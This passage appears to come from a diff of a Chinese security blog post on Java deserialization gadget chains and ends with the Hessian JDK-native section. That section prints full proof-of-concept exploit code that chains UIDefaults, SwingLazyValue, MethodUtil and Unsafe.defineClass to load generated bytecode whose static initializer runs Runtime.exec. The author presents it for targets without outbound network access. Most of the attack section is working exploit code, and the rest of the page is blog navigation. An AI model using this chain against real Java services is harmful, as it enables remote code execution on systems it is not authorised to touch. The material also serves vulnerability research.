class="string">"javax.management.BadAttributeValueExpException"</span>).getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">         SerializeUtil.serialize(exp);</span><br><span class="line">         SerializeUtil.unSerialize();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<h2 id="Hessian-JDK-原生反序列化"><a href="#Hessian-JDK-原生反序列化" class="headerlink" title="Hessian JDK 原生反序列化"></a>Hessian JDK 原生反序列化</h2><p>Hessain 反序列化 相较于原生的反序列化 类不需要实现<code>Serializable</code>​接口也能进行序列化和反序列化</p>
+<p>这样范围就比原生的要广</p>
+<p>实战中可能由于对方机器由于防火墙限制不能出网，那么就不能打JNDI</p>
+<p>这时候就需要这一条链，Hessian反序列化的不出网打法</p>
+<h4 id="任意静态方法调用"><a href="#任意静态方法调用" class="headerlink" title="任意静态方法调用"></a>任意静态方法调用</h4><p>‍</p>
+<p>在网上一个师傅的文章里找到了一条JDK原生的可以invoke任意静态方法，或实例化任意类的gadget：</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">UIDefaults#get-&gt;</span><br><span class="line">   UIDefaults#getFromHashTable-&gt;</span><br><span class="line">      UIDefaults$LazyValue#createValue-&gt;</span><br><span class="line">              SwingLazyValue#createValue</span><br></pre></td></tr></tbody></table></figure>
+
+<p>​<code>UIDefaults</code>​这个类中</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-28_14-31-12-20241028143353-o726eo3.png">​</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-28_14-34-31-20241028143449-e75v1q6.png">​</p>
+<p>​<code>SwingLazyValue</code>​中</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-28_14-25-30-20241028142656-0kj3iwu.png">​</p>
+<p>这里只能调用类中的静态方法</p>
+<p>其实之后可以调用InitContext#doLookup方法</p>
+<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>不出网执行任意代码的手段之一是将字节码<code>defineClass</code>​然后<code>newInstense</code>​，比如像基于<code>TemplatesImpl</code>​的原生反序列化。之前看内存马的时候，就用过Unsafe去加载一个类</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-28_14-37-10-20241028143731-hqjyo46.png">​</p>
+<p>但是这并不是一个静态方法，还需要套一层</p>
+<p>​<code>Trampoline#invoke</code>​ 方法能够实现静态方法到unsafe里的defineClass</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-28_15-26-59-20241028152722-ar2qhrq.png">​</p>
+<p>但是直接加载<code>Trampoline</code>​这个类，会发生报错</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-28_15-50-20-20241028155053-ha42x41.png">​</p>
+<p>于是又找到<code>MethodUtil</code>​这个类的invoke方法</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-28_15-52-03-20241028155253-y3510k6.png">​</p>
+<p>​<code>MethodUtil</code>​中的invoke也是通过<code>Trampoline#invoke</code>​这个方法触发的</p>
+<p>由于参数类型的原因，需要套娃一层才能够进行defineClass</p>
+<p>调用一次defineClass不能执行静态代码块，需要再利用<code>SwingLazyValue</code>​再来一次newInstance</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">"GeneratedClass"</span>;</span><br><span class="line">      <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">      <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(className);</span><br><span class="line">      ctClass.makeClassInitializer().insertBefore(</span><br><span class="line">              <span class="string">"Runtime.getRuntime().exec(\"calc\");"</span></span><br><span class="line">      );</span><br><span class="line">      <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">      Method defineClass=Unsafe.class.getDeclaredMethod(<span class="string">"defineClass"</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class, ClassLoader.class, ProtectionDomain.class);</span><br><span class="line">      Object[] defineClassArgs =<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"GeneratedClass"</span>,bytes,<span class="number">0</span>,bytes.length,<span class="literal">null</span>,<span class="literal">null</span>};</span><br><span class="line"></span><br><span class="line">      <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">"theUnsafe"</span>);</span><br><span class="line">      f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//套娃调用</span></span><br><span class="line">      <span class="type">Method</span> <span class="variable">invoke</span> <span class="operator">=</span> MethodUtil.class.getMethod(<span class="string">"invoke"</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">      Object[] invokeArgs =<span class="keyword">new</span> <span class="title class_">Object</span>[]{defineClass,unsafe,defineClassArgs};</span><br><span class="line"></span><br><span class="line">      <span class="type">SwingLazyValue</span> <span class="variable">defineClassswingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">"sun.reflect.misc.MethodUtil"</span>,<span class="string">"invoke"</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]{invoke,<span class="keyword">new</span> <span class="title class_">Object</span>(),invokeArgs});</span><br><span class="line">      Object[] keyValueList1 = <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"a"</span>, defineClassswingLazyValue};</span><br><span class="line">      <span class="type">SwingLazyValue</span> <span class="variable">newInstanceswingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">"GeneratedClass"</span>,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">      Object[] keyValueList2 = <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"ddd"</span>, newInstanceswingLazyValue};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList1);</span><br><span class="line">      <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList2);</span><br><span class="line">  </span><br><span class="line">      uiDefaults.get(<span class="string">"a"</span>);</span><br><span class="line">      uiDefaults2.get(<span class="string">"ddd"</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="触发get"><a href="#触发get" class="headerlink" title="触发get"></a>触发get</h4><p>HashTable 的equal方法</p>
+<p>所以是</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">HashMap#put-&gt;</span><br><span class="line">	HashTable#equal-&gt;</span><br><span class="line">		UIDefaults#get</span><br></pre></td></tr></tbody></table></figure>
+
+<p>偷懒了，搬运其他师傅的poc</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">       <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">"GeneratedClass"</span>;</span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(className);</span><br><span class="line">       ctClass.makeClassInitializer().insertBefore(</span><br><span class="line">               <span class="string">"Runtime.getRuntime().exec(\"calc\");"</span></span><br><span class="line">       );</span><br><span class="line">       <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">       Method defineClass=Unsafe.class.getDeclaredMethod(<span class="string">"defineClass"</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class, ClassLoader.class, ProtectionDomain.class);</span><br><span class="line">       Object[] defineClassArgs =<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"GeneratedClass"</span>,bytes,<span class="number">0</span>,bytes.length,<span class="literal">null</span>,<span class="literal">null</span>};</span><br><span class="line"></span><br><span class="line">       <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">"theUnsafe"</span>);</span><br><span class="line">       f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//封装参数,为Object (MethodUtil.invoke调用MethodUtil.invoke)</span></span><br><span class="line">       <span class="type">Method</span> <span class="variable">invoke</span> <span class="operator">=</span> MethodUtil.class.getMethod(<span class="string">"invoke"</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">       Object[] invokeArgs =<span class="keyword">new</span> <span class="title class_">Object</span>[]{defineClass,unsafe,defineClassArgs};</span><br><span class="line"></span><br><span class="line">       <span class="type">SwingLazyValue</span> <span class="variable">defineClassswingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">"sun.reflect.misc.MethodUtil"</span>,<span class="string">"invoke"</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]{invoke,<span class="keyword">new</span> <span class="title class_">Object</span>(),invokeArgs});</span><br><span class="line">       Object[] keyValueList1 = <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"a"</span>, defineClassswingLazyValue};</span><br><span class="line">       <span class="type">SwingLazyValue</span> <span class="variable">newInstanceswingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">"GeneratedClass"</span>,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">       Object[] keyValueList2 = <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"ddd"</span>, newInstanceswingLazyValue};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList1);</span><br><span class="line">       <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList1);</span><br><span class="line">       <span class="type">UIDefaults</span> <span class="variable">uiDefaults3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList2);</span><br><span class="line">       <span class="type">UIDefaults</span> <span class="variable">uiDefaults4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList2);</span><br><span class="line">       Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">       Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">       Hashtable&lt;Object, Object&gt; hashtable3 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">       Hashtable&lt;Object, Object&gt; hashtable4 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">       hashtable1.put(<span class="string">"a"</span>, uiDefaults1);</span><br><span class="line">       hashtable2.put(<span class="string">"a"</span>, uiDefaults2);</span><br><span class="line">       hashtable3.put(<span class="string">"b"</span>, uiDefaults3);</span><br><span class="line">       hashtable4.put(<span class="string">"b"</span>, uiDefaults4);</span><br><span class="line">       HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">       ReflectField.setField(s, <span class="string">"size"</span>, <span class="number">4</span>);</span><br><span class="line">       Class&lt;?&gt; nodeC;</span><br><span class="line">       <span class="keyword">try</span> {</span><br><span class="line">           nodeC = Class.forName(<span class="string">"java.util.HashMap$Node"</span>);</span><br><span class="line">       } <span class="keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">           nodeC = Class.forName(<span class="string">"java.util.HashMap$Entry"</span>);</span><br><span class="line">       }</span><br><span class="line">       Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">       nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">4</span>);</span><br><span class="line">       Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable1, hashtable1, <span class="literal">null</span>));</span><br><span class="line">       Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable2, hashtable2, <span class="literal">null</span>));</span><br><span class="line">       Array.set(tbl, <span class="number">2</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable3, hashtable3, <span class="literal">null</span>));</span><br><span class="line">       Array.set(tbl, <span class="number">3</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable4, hashtable4, <span class="literal">null</span>));</span><br><span class="line">       ReflectField.setField(s, <span class="string">"table"</span>, tbl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="type">byte</span>[] serialize = HessianSerialize.serialize(s);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">deserialize</span> <span class="operator">=</span> HessianSerialize.deserialize(serialize);</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其他利用：<a target="_blank" rel="noopener" href="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/">https://yzddmr6.com/posts/swinglazyvalue-in-webshell/</a></p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8%E9%93%BE">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8%E9%93%BE</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12846">https://xz.aliyun.com/t/12846</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html">https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html</a></p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/hessian/" rel="tag">hessian</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag">反序列化漏洞</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/cover/8.png" data-sizes="auto" alt="class文件结构" class="lazyload">
+      
+      <a href="/2025/01/27/class%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          class文件结构
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="gtcomment"></div>
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Fastjson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-%E8%A7%A6%E5%8F%91getter"><span class="toc-number">1.2.</span> <span class="toc-text">toString() 触发getter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.3.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-49%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">1.2.49的限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#resolveClass%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">resolveClass限制绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">Jackson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jackson%E9%93%BE%E7%9A%84%E4%B8%8D%E7%A8%B3%E5%AE%9A%E6%80%A7"><span class="toc-number">2.2.</span> <span class="toc-text">Jackson链的不稳定性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88poc"><span class="toc-number">2.3.</span> <span class="toc-text">最终poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hessian-JDK-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">Hessian JDK 原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">3.0.1.</span> <span class="toc-text">任意静态方法调用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#defineClass"><span class="toc-number">3.1.</span> <span class="toc-text">defineClass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91get"><span class="toc-number">3.1.1.</span> <span class="toc-text">触发get</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
+  <div class="sidebar-author-name">Yyjccc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">47</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">72</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2025
+      <span class="footer-info-sep"></span>
+      Yyjccc
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        163.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        11:09
+      </div>
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Fastjson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-%E8%A7%A6%E5%8F%91getter"><span class="toc-number">1.2.</span> <span class="toc-text">toString() 触发getter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.3.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-49%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">1.2.49的限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#resolveClass%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">resolveClass限制绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">Jackson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jackson%E9%93%BE%E7%9A%84%E4%B8%8D%E7%A8%B3%E5%AE%9A%E6%80%A7"><span class="toc-number">2.2.</span> <span class="toc-text">Jackson链的不稳定性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88poc"><span class="toc-number">2.3.</span> <span class="toc-text">最终poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hessian-JDK-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">Hessian JDK 原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">3.0.1.</span> <span class="toc-text">任意静态方法调用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#defineClass"><span class="toc-number">3.1.</span> <span class="toc-text">defineClass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91get"><span class="toc-number">3.1.1.</span> <span class="toc-text">触发get</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
+  <div class="sidebar-author-name">Yyjccc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">47</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">72</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
